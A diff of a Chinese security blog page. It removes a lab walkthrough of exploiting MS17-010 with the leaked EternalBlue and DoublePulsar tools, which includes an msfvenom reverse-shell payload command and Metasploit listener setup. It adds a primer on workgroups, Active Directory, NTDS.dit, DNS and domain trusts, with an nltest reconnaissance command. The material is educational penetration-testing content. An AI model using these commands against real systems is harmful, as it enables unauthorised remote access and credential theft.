@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          MS17_010py脚本利用 - Kat | Blog
+          内网渗透基础 - Kat | Blog
         
     </title>
 
-    <link rel="canonical" href="https://spanning-tree.xyz/2020/11d3b845db.html">
+    <link rel="canonical" href="https://spanning-tree.xyz/2021/047b3f29f2.html">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -88,14 +88,14 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#Redteam" title="Redteam">Redteam</a>
+                              <a class="tag" href="/tags/#内网渗透" title="内网渗透">内网渗透</a>
                             
                         </div>
-                        <h1>MS17_010py脚本利用</h1>
+                        <h1>内网渗透基础</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by Kat on
-                            2020-11-19
+                            2021-04-11
                         </span>
                     </div>
                 
@@ -215,48 +215,61 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h3 id="ms17_010py脚本利用">MS17_010py脚本利用</h3>
-<p>为什么要介绍使用py脚本？</p>
-<p>因为有些机器存在漏洞，但是MSF模块利用失败，而使用py脚本可以成功利用。</p>
-<h4 id="安装环境">安装环境</h4>
-<blockquote>
-<p>运行python环境的系统必须为32位，需要下载安装扩展文件。</p>
-<p>Windows x86 python-2.6.6.msi：<br>
-<a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">https://www.python.org/download/releases/2.6.6/</a><br>
-pywin32-221.win32-py2.6.exe：<br>
-<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32/Build 221/</a><br>
-方程式ETERNALBLUE 下载地址：<br>
-<a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master" target="_blank" rel="noopener">https://codeload.github.com/misterch0c/shadowbroker/zip/master</a></p>
-</blockquote>
-<h4 id="环境简介">环境简介</h4>
-<blockquote>
-<p>靶机：192.168.1.103（Win7-64）</p>
-<p>操作机：192.168.1.101 （MAC）</p>
-<p>操作机：192.168.1.104（Win7-32）</p>
-</blockquote>
-<h4 id="利用">利用</h4>
-<p>1、生成payload</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=1234 -f dll &gt;64.dll</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuwbm3sd6j30s905f76d.jpg" alt="image-20201119232432736"></p>
-<p>2、本地msf进行监听</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuweb222cj30mt076q5c.jpg" alt="image-20201119232708013"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lport 192.168.1.101</span><br><span class="line">set lport 1234</span><br></pre></td></tr></table></figure>
-<p>3、新建listeningposts文件夹并将msf生成的dll文件放入根目录，运行fb.py文件</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuv2prpxwj30k20qp77x.jpg" alt="image-20201119224124041"></p>
-<p>设置攻击相关信息</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuw2bsuqij30i30esmze.jpg" alt="image-20201119231537200"></p>
-<p>Use Eternalblue 使用Eternalblue插件</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuw4xvfdkj30pv0qkdiy.jpg" alt="image-20201119231807745"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuw6jxu2wj30qo0c1wg3.jpg" alt="image-20201119231941181"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvl9ygttj30nv0ifq5v.jpg" alt="image-20201119225913910"></p>
-<p>接下来使用doublepulsar插件</p>
-<p>Use doublepulsar</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvpcxyb4j30oe0qtdiy.jpg" alt="image-20201119230309957"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvsaaynnj30lp0rhadk.jpg" alt="image-20201119230558825"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuvu5s99kj30mr0kwtbd.jpg" alt="image-20201119230746276"></p>
-<p>这个时候返回msf，成功收到会话。</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gkuwitxzy4j30nq09x41b.jpg" alt="image-20201119233129340"></p>
-
+                <h1 id="内网渗透基础">内网渗透基础</h1>
+<h2 id="1-工作组与域环境">1. 工作组与域环境</h2>
+<p><strong>工作组</strong></p>
+<p>其实在工作组环境中没有什么特殊的且工作组环境没有任何集中管理的机制。</p>
+<p>默认均属于workgroup组，即便属于不同的组，不同的计算机之间仍然可以通过账号密码进行互相访问；工作组之间的计算机属于对等网络。</p>
+<p>实际环境中还是通过不同的网段进行划分与隔离不同部门的计算机。</p>
+<p><strong>域环境</strong></p>
+<p>域环境相当于存在一个安全边界的计算机集合，相对比工作组环境域环境中具有完善的安全管理机制，不同的域环境之间不能互相访问。如果需要访问域中的网络资源则需要合理的认证且符合相应的访问权限。</p>
+<p><strong>DC</strong></p>
+<p>由于域环境是B/S架构集中管理机制，所以在域环境中就存在域控制器（Domain Control）来管理所有客户端的一台服务器。</p>
+<p>一个域环境中可以有多个域控制器，多个域控制器之间地位是相等的。</p>
+<p>主要职责：负责每一台连入电脑和用户的验证工作，域内成员需要互相访问则需要他的审核。</p>
+<p><strong>RODC</strong></p>
+<p>在域环境中还存在一种特殊的域控制器，通常在多个域控制器的情况下。</p>
+<p>RODC（Read-Only Domain Controlle）只读域控制器</p>
+<p>RODC的活动目录（AD）不能修改和删除且活动目录只能从其他的域控制器中复制过来，但RODC不会存储账号密码等信息。所以在验证账号密码的时候仍然需要总域控进行校验。</p>
+<p>RODC的设计初衷主要是给远程分公司使用，防止活动目录遭到破坏而影响整个域环境。</p>
+<h2 id="2-活动目录adactive-directory">2. 活动目录AD（Active Directory）</h2>
+<p>什么是活动目录？</p>
+<p>活动目录是域环境中提供目录服务的组件，在活动目录中数据以目录结构方式进行保存。</p>
+<p>活动目录主要存放什么数据？</p>
+<p>活动目录中主要存放有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。<strong>目录服务是帮助用户快速准确查找他所需要的信息服务</strong></p>
+<p>如果将内网看作一本字典，域中的信息资源即为字典中的内容而活动目录就是字典的索引。</p>
+<p>活动目录中记录的内容被分为俩大部分：</p>
+<p>一部分保存在活动目录数据文件NTDS.dit中，另外一部分保存在被复制的文件系统中。</p>
+<p><strong>NTDS.dit</strong></p>
+<p>NTDS.dit文件是活动目录的数据库文件，该文件中主要保存3张表：</p>
+<ul>
+<li>Schema表：这张表中包含了所有在活动目录中创建对象的信息以及他们之间的关系，且包含对象可选以及不可选的属性。是活动目录中最小的一张表，也是最基础的一张表。</li>
+<li>Link表：包含对象的属性信息，以及所属组的信息。大小小于Data大于Schema表。</li>
+<li>Data表：活动目录中的用户、组、应用程序数据特殊数据和其他数据均保存在此表中。这是活动目录中保存信息最多的一张表。</li>
+</ul>
+<p><strong>Ntdsutil.exe</strong></p>
+<p>ntdsutil.exe 是域控制器自带的域数据库管理工具，从 windows Server 2008 开始就默认自带了。因此我们可以通过 ntdsutil.exe 提取出域中所有的域用户信息。</p>
+<h2 id="3-dns域名服务器">3. DNS域名服务器</h2>
+<p>域环境中DNS服务器起到至关重要的作用，通常DNS服务器与域控在同一台机器上。</p>
+<p>通过DNS记录有助于以及了解域环境中的网络架构，收集内网中服务信息。</p>
+<ul>
+<li>
+<p>域控服务器要求 DNS 服务器按名称查找计算机、成员服务器和网络服务。</p>
+</li>
+<li>
+<p>域名解析： DNS 服务器通过其 A 记录将域名解析成 IP 地址</p>
+</li>
+<li>
+<p>定位活动目录服务：客户机通过 DNS 服务器上的 SRV 服务记录定位提供某一个服务的计算机</p>
+</li>
+</ul>
+<p><strong>SRV 服务记录</strong>是 DNS 服务器的数据库中支持的一种资源记录的类型，它记录了哪台计算机提供了哪个服务这么一个简单的信息。</p>
+<p>DNS服务器可独立工作，但是为了活动目录正常工作DNS服务器必须支持SRV资源记录。</p>
+<h2 id="4-域信任">4. 域信任</h2>
+<p>什么是域名信任？</p>
+<p>现有公司总部A有一个域环境，子公司B又一个单独的域环境。</p>
+<p>公司总部A信任子公司B，则子公司B可以使用域账号访问总公司A。反之反之如果子公司B没有信任总公司A，总公司的账号是不能登陆到子公司的域中。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts #返回受信任域列表，可以在内网机器中执行可以判断是否存在域</span><br></pre></td></tr></table></figure>
                 
 
                 <hr>
@@ -264,9 +277,13 @@ pywin32-221.win32-py2.6.exe：<br>
                 <ul class="pager">
                     
                         <li class="previous">
-                            <a href="/2020/112273054a.html" data-toggle="tooltip" data-placement="top" title="使用drozer框架测试安卓组件">&larr; Previous Post</a>
+                            <a href="/2021/043e4e3078.html" data-toggle="tooltip" data-placement="top" title="LDAP协议">&larr; Previous Post</a>
                         </li>
                     
+                    
+                        <li class="next">
+                            <a href="/2021/01556a6f96.html" data-toggle="tooltip" data-placement="top" title="基于钉钉的内网穿透工具使用">Next Post &rarr;</a>
+                        </li>
                     
                 </ul>
 
@@ -321,7 +338,7 @@ pywin32-221.win32-py2.6.exe：<br>
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ms17_010py脚本利用"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MS17_010py&#x811A;&#x672C;&#x5229;&#x7528;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#安装环境"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">&#x5B89;&#x88C5;&#x73AF;&#x5883;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#环境简介"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">&#x73AF;&#x5883;&#x7B80;&#x4ECB;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#利用"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">&#x5229;&#x7528;</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#内网渗透基础"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">&#x5185;&#x7F51;&#x6E17;&#x900F;&#x57FA;&#x7840;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#1-工作组与域环境"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">1. &#x5DE5;&#x4F5C;&#x7EC4;&#x4E0E;&#x57DF;&#x73AF;&#x5883;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#2-活动目录adactive-directory"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">2. &#x6D3B;&#x52A8;&#x76EE;&#x5F55;AD&#xFF08;Active Directory&#xFF09;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#3-dns域名服务器"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">3. DNS&#x57DF;&#x540D;&#x670D;&#x52A1;&#x5668;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#4-域信任"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">4. &#x57DF;&#x4FE1;&#x4EFB;</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -341,7 +358,7 @@ pywin32-221.win32-py2.6.exe：<br>
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#Redteam" title="Redteam">Redteam</a>
+                          <a class="tag" href="/tags/#内网渗透" title="内网渗透">内网渗透</a>
                         
                     </div>
                 </section>
